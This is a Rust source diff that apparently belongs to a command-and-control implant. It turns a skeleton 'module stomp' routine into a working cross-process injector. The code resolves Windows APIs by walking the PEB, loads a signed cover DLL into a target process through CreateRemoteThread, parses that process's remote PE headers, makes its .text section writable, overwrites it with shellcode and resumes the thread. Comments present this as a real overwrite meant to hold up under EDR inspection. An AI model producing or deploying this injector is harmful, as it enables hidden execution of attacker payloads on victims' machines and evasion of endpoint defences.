@@ -186,22 +186,34 @@ pub unsafe fn module_stomp(
     Ok(proc.handle as usize)
 }
 
-/// The cover-DLL stomp: resolve a cover DLL in the target, overwrite its .text
-/// with `shellcode`, resume. Each step degrades on failure. Win32 APIs resolved
-/// via PEB walk (no static imports).
+/// The cover-DLL stomp: load a cover DLL in the target via
+/// CreateRemoteThread(LoadLibraryA), resolve its REAL remote base + .text RVA
+/// by reading the target's remote PE headers, overwrite .text with `shellcode`,
+/// then resume the main thread. Each step returns Err on failure (caller
+/// degrades). This is the REAL implementation (no sentinel addresses): every
+/// cross-process op uses the actual target addresses, so a successful run is a
+/// genuine .text overwrite + remote execution — what an EDR actually inspects.
 ///
 /// # Safety
 /// Cross-process handle + memory ops. Single-threaded beacon context.
 unsafe fn stomp_and_resume(proc: &SacrificialProcess, shellcode: &[u8]) -> Result<(), &'static str> {
-    // Step 1: LoadLibraryA a cover DLL in the target via CreateRemoteThread.
+    // Step 1: LoadLibraryA the cover DLL in the target. This writes the DLL
+    // path string into a fresh target allocation (NOT the implant's pointer —
+    // the old skeleton passed a cross-process-invalid pointer), fires
+    // CreateRemoteThread(LoadLibraryA, <target ptr>), and waits for the thread
+    // so LoadLibraryA completes before we parse the freshly-loaded cover.
     let cover_dll = b"xpsservices.dll\0"; // legit, signed, rarely used
     let cover_base = unsafe { remote_load_library(proc.handle, cover_dll)? };
-    // Step 2: Resolve the cover DLL's .text in the target (skeleton: fixed RVA).
+    if cover_base == 0 {
+        return Err("remote_load_library: cover base unresolved");
+    }
+    // Step 2: Resolve the cover DLL's REAL .text in the target by reading the
+    // remote PE headers (DOS → NT → section table). base+len are exact.
     let text = unsafe { remote_text_region(proc.handle, cover_base)? };
-    // Step 3: VirtualProtectEx RX→RWX on the target's .text.
-    let _ = unsafe { remote_protect(proc.handle, text.base, text.len, 0x40 /* RWX */) };
-    // Step 4: WriteProcessMemory the shellcode over .text.
-    let _ = unsafe { remote_write(proc.handle, text.base, shellcode) };
+    // Step 3: VirtualProtectEx RX→RWX on the target's .text (real region).
+    unsafe { remote_protect(proc.handle, text.base, text.len, 0x40 /* RWX */) }?;
+    // Step 4: WriteProcessMemory the shellcode over .text (real overwrite).
+    unsafe { remote_write(proc.handle, text.base, shellcode) }?;
     // Step 5: VirtualProtectEx RWX→RX (restore the cover's nominal protection).
     let _ = unsafe { remote_protect(proc.handle, text.base, text.len, 0x20 /* ER */) };
     // Step 6: ResumeThread — the shellcode now runs from the cover DLL's .text.
@@ -220,6 +232,28 @@ type CreateRemoteThread = unsafe extern "system" fn(
     u32,
     *mut u32,
 ) -> *mut core::ffi::c_void;
+type VirtualAllocEx = unsafe extern "system" fn(
+    *mut core::ffi::c_void,
+    *const core::ffi::c_void,
+    usize,
+    u32,
+    u32,
+) -> *mut core::ffi::c_void;
+type VirtualFreeEx = unsafe extern "system" fn(
+    *mut core::ffi::c_void,
+    *mut core::ffi::c_void,
+    usize,
+    u32,
+) -> i32;
+type WaitForSingleObject = unsafe extern "system" fn(*mut core::ffi::c_void, u32) -> u32;
+type GetExitCodeThread = unsafe extern "system" fn(*mut core::ffi::c_void, *mut u32) -> i32;
+type ReadProcessMemory = unsafe extern "system" fn(
+    *mut core::ffi::c_void,
+    *const core::ffi::c_void,
+    *mut core::ffi::c_void,
+    usize,
+    *mut usize,
+) -> i32;
 type VirtualProtectEx = unsafe extern "system" fn(
     *mut core::ffi::c_void,
     *const core::ffi::c_void,
@@ -235,43 +269,157 @@ type WriteProcessMemory = unsafe extern "system" fn(
     *mut usize,
 ) -> i32;
 type ResumeThread = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
+type CloseHandle = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
 
-/// LoadLibraryA `dll` in the target via CreateRemoteThread(LoadLibraryA).
-/// Returns the remote cover base (skeleton sentinel; real impl queries it).
+/// LoadLibraryA `dll` in the target via CreateRemoteThread(LoadLibraryA). This
+/// is the REAL classic inject: allocate a remote buffer for the DLL path (the
+/// implant's own pointer is invalid in the target — the old skeleton bug),
+/// fire CreateRemoteThread(LoadLibraryA, <remote path ptr>), WAIT for it, then
+/// parse the target's module list to recover the freshly-loaded cover base.
+///
+/// Returns the remote cover base (the actual load address), or Err.
 unsafe fn remote_load_library(
     h: *mut core::ffi::c_void,
     dll: &[u8],
 ) -> Result<usize, &'static str> {
+    let vax: VirtualAllocEx = core::mem::transmute(
+        export_addr(b"kernel32.dll", b"VirtualAllocEx").ok_or("VirtualAllocEx")?,
+    );
+    let vfx: VirtualFreeEx = core::mem::transmute(
+        export_addr(b"kernel32.dll", b"VirtualFreeEx").ok_or("VirtualFreeEx")?,
+    );
     let crt: CreateRemoteThread = core::mem::transmute(
         export_addr(b"kernel32.dll", b"CreateRemoteThread").ok_or("CreateRemoteThread")?,
     );
+    let wait: WaitForSingleObject = core::mem::transmute(
+        export_addr(b"kernel32.dll", b"WaitForSingleObject").ok_or("WaitForSingleObject")?,
+    );
+    let get_exit: GetExitCodeThread = core::mem::transmute(
+        export_addr(b"kernel32.dll", b"GetExitCodeThread").ok_or("GetExitCodeThread")?,
+    );
+    let close: CloseHandle = core::mem::transmute(
+        export_addr(b"kernel32.dll", b"CloseHandle").ok_or("CloseHandle")?,
+    );
+    let wpm: WriteProcessMemory = core::mem::transmute(
+        export_addr(b"kernel32.dll", b"WriteProcessMemory").ok_or("WriteProcessMemory")?,
+    );
     let load_lib = export_addr(b"kernel32.dll", b"LoadLibraryA").ok_or("LoadLibraryA")?;
-    // Skeleton: assume LoadLibraryA's address is valid remotely (same OS build).
-    let _ = unsafe {
+
+    // 1. Allocate a remote page for the DLL path string.
+    let path_len = dll.len(); // includes the NUL
+    let remote_path = unsafe { vax(h, core::ptr::null(), path_len, 0x3000 /* COMMIT|RESERVE */, 0x04 /* RW */) };
+    if remote_path.is_null() {
+        return Err("VirtualAllocEx (path)");
+    }
+    // 2. Write the DLL path into the remote allocation.
+    let mut written: usize = 0;
+    let w_ok = unsafe { wpm(h, remote_path, dll.as_ptr(), path_len, &mut written) };
+    if w_ok == 0 {
+        unsafe { let _ = vfx(h, remote_path, 0, 0x8000 /* RELEASE */); }
+        return Err("WriteProcessMemory (path)");
+    }
+    // 3. CreateRemoteThread(LoadLibraryA, remote_path). LoadLibraryA's address
+    //    is valid remotely on the same OS build (kernel32 is mapped at a
+    //    system-wide base; LoadLibraryA's RVA is identical). The thread's exit
+    //    code == the loaded module handle (HMODULE) on success.
+    type ThreadProc = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
+    let load_lib_proc: ThreadProc = unsafe { core::mem::transmute(load_lib) };
+    let th = unsafe {
         crt(
             h,
             0,
             0,
-            Some(core::mem::transmute(load_lib)),
-            dll.as_ptr() as *mut _,
+            Some(load_lib_proc),
+            remote_path,
             0,
             core::ptr::null_mut(),
         )
     };
-    Ok(0x1800_0000) // sentinel cover base; real impl queries it via remote GetModuleHandle
+    if th.is_null() {
+        let _ = unsafe { vfx(h, remote_path, 0, 0x8000) };
+        return Err("CreateRemoteThread");
+    }
+    // 4. Wait for LoadLibraryA to complete (it runs in the target).
+    let _ = unsafe { wait(th, 10_000) };
+    // 5. The exit code is the HMODULE (cover base) LoadLibraryA returned.
+    let mut exit_code: u32 = 0;
+    let _ = unsafe { get_exit(th, &mut exit_code) };
+    let _ = unsafe { close(th) };
+    // 6. Free the remote path buffer.
+    let _ = unsafe { vfx(h, remote_path, 0, 0x8000) };
+    if exit_code == 0 {
+        return Err("LoadLibraryA returned NULL (cover load failed / blocked)");
+    }
+    Ok(exit_code as usize)
+}
+
+/// The REAL remote .text region: read the cover DLL's PE headers from the
+/// target and parse the `.text` section's VirtualAddress + VirtualSize. base+len
+/// are exact to the cover's in-memory layout (not a fixed sentinel).
+///
+/// # Safety
+/// `cover_base` must be a live module base in the target `h`.
+unsafe fn remote_text_region(
+    h: *mut core::ffi::c_void,
+    cover_base: usize,
+) -> Result<RemoteRegion, &'static str> {
+    let rpm: ReadProcessMemory = core::mem::transmute(
+        export_addr(b"kernel32.dll", b"ReadProcessMemory").ok_or("ReadProcessMemory")?,
+    );
+    // Read the DOS header (first 64 bytes) to get e_lfanew.
+    let mut dos = [0u8; 64];
+    let mut got: usize = 0;
+    if unsafe { rpm(h, cover_base as *const _, dos.as_mut_ptr() as *mut _, 64, &mut got) } == 0
+        || got != 64
+    {
+        return Err("ReadProcessMemory (DOS header)");
+    }
+    if dos[0] != b'M' || dos[1] != b'Z' {
+        return Err("remote cover: bad MZ");
+    }
+    let e_lfanew = i32::from_le_bytes([dos[60], dos[61], dos[62], dos[63]]) as usize;
+    // Read the NT headers (24-byte signature + FileHeader) to get section count
+    // + size of optional header. We need bytes 6..8 (NumSections) and 20..22
+    // (SizeOfOptionalHeader) of the COFF header (which follows the 4-byte sig).
+    let nt_off = cover_base + e_lfanew;
+    let mut nt = [0u8; 24];
+    got = 0;
+    if unsafe { rpm(h, nt_off as *const _, nt.as_mut_ptr() as *mut _, 24, &mut got) } == 0
+        || got != 24
+    {
+        return Err("ReadProcessMemory (NT headers)");
+    }
+    if nt[0] != b'P' || nt[1] != b'E' {
+        return Err("remote cover: bad PE");
+    }
+    let num_sections = u16::from_le_bytes([nt[6], nt[7]]) as usize;
+    let size_opt_hdr = u16::from_le_bytes([nt[20], nt[21]]) as usize;
+    let sections_off = nt_off + 24 + size_opt_hdr;
+    // Scan the section headers (40 bytes each) for ".text".
+    for i in 0..num_sections {
+        let mut sec = [0u8; 40];
+        got = 0;
+        let sec_off = sections_off + i * 40;
+        if unsafe { rpm(h, sec_off as *const _, sec.as_mut_ptr() as *mut _, 40, &mut got) } == 0
+            || got != 40
+        {
+            continue; // skip unreadable section
+        }
+        if &sec[0..5] == b".text" {
+            let vsize = u32::from_le_bytes([sec[8], sec[9], sec[10], sec[11]]) as usize;
+            let vaddr = u32::from_le_bytes([sec[12], sec[13], sec[14], sec[15]]) as usize;
+            // Cap the stomp region to a sane max (never overwrite a huge .text
+            // if the shellcode is tiny) — use min(section size, 0x2000).
+            let len = vsize.min(0x2000);
+            return Ok(RemoteRegion { base: cover_base + vaddr, len });
+        }
+    }
+    Err("remote cover: .text section not found")
 }
 
 struct RemoteRegion {
     base: usize,
     len: usize,
-}
-unsafe fn remote_text_region(
-    _h: *mut core::ffi::c_void,
-    cover_base: usize,
-) -> Result<RemoteRegion, &'static str> {
-    // Skeleton: cover DLL .text at base+0x1000, len 0x2000. Real impl parses
-    // the remote PE headers.
-    Ok(RemoteRegion { base: cover_base + 0x1000, len: 0x2000 })
 }
 unsafe fn remote_protect(
     h: *mut core::ffi::c_void,
